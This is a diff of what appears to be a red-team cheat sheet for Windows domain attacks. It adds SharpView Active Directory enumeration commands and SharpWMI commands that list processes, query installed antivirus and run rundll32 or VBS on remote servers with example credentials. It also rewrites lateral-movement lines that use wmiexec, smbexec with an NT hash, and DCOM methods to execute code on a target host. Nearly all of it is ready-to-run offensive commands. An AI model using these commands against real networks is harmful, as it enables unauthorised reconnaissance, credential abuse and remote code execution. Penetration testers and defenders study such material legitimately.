@@ -141,20 +141,30 @@ sharpview Get-NetGroup -Name *admin* -Domain -Properties samaccountname,member -
 sharpview Get-NetGroupMember -LDAPFilter GroupName=*Admins* -Recurse -Properties samaccountname
 sharpview Get-NetUser -Name deb -Domain blorebank.local
 sharpview Get-NetSession -Domain blorebank.local
+sharpview Get-NetOU -Properties distinguishedname
 sharpview Get-DomainController -Domain blorebank.local
 sharpview Get-DomainUser -LDAPFilter samaccountname=ben -Properties samaccountname,mail
 sharpview Get-DomainUser -AdminCount -Properties samaccountname
 sharpview Get-DomainComputer -LDAPFilter operatingsystem=*2012* -Properties samaccountname
 sharpview Find-InterestingFile -Path c:\\users\\ -Include *exe*
 sharpview Find-InterestingDomainShareFile -ComputerName SERVER01
+sharpview Get-DomainComputer -SearchBase "OU=Domain Controllers,DC=contoso,DC=local" -Properties samaccountname
+sharpwmi action=query query="select * from win32_process"
+sharpwmi action=query query="select * from win32_process where name='explorer.exe'" computername=SERVER01,SERVER02
+sharpwmi action=create command="C:\\windows\\system32\\rundll32 [args]" computername=SERVER01,SERVER02
+sharpwmi action=create command="C:\\windows\\system32\\rundll32 [args]" computername=SERVER01,SERVER02
+sharpwmi action=query query="select * from win32_process" computername=SERVER01 username=DOMAIN\\user password=Password123!
+sharpwmi action=query query="select * FROM AntiVirusProduct" namespace="root\\SecurityCenter2"
+sharpwmi action=executevbs computername=SERVER01,SERVER02
 
 Lateral Movement:
 ==================
-run-exe WMIExec.Program WExec -t 10.0.0.1 -u admin -d domain -p password1 -c "rundll32 c:\\users\\public\\run.dll,etp"
-run-exe SMBExec.Program SExec -t 10.0.0.1 -u admin -d domain -h <nthash> -c "rundll32 c:\\users\\public\\run.dll,etp"
-run-exe Invoke_DCOM.Program DCOM -t 10.0.0.1 -m mmc -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
-run-exe Invoke_DCOM.Program DCOM -t 10.0.0.1 -m shellbrowserwindow -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
-run-exe Invoke_DCOM.Program DCOM -t 10.0.0.1 -m shellwindows -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
+sharpwmi action=create command="C:\\windows\\system32\\rundll32 [args]" computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123!
+wmiexec -t 10.0.0.1 -u admin -d domain -p password1 -c "rundll32 c:\\users\\public\\run.dll,etp"
+smbexec -t 10.0.0.1 -u admin -d domain -h <nthash> -c "rundll32 c:\\users\\public\\run.dll,etp"
+dcomexec -t 10.0.0.1 -m mmc -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
+dcomexec -t 10.0.0.1 -m shellbrowserwindow -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
+dcomexec -t 10.0.0.1 -m shellwindows -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
 
 Socks:
 ======
